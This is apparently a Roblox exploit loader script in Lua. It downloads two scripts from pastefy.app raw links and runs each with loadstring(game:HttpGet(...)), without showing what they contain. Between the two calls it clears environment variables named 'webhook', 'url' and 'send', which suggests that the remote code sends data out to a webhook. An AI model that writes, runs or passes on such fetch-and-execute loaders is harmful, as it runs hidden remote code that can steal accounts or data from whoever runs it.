-- Run first script
loadstring(game:HttpGet("https://pastefy.app/YAiCtEd0/raw", true))()

wait(2) -- Give it time to execute

-- Clear any conflicting variables before running second script
local env = getfenv()
local backup = {}

-- Backup and remove potentially conflicting variables
local conflicts = {"webhook", "Webhook", "WEBHOOK", "url", "Url", "URL", "send", "Send"}
for _, var in pairs(conflicts) do
    if env[var] ~= nil then
        backup[var] = env[var]
        env[var] = nil
    end
end

-- Now run second script
loadstring(game:HttpGet("https://pastefy.app/Pt1O0Ijt/raw", true))()
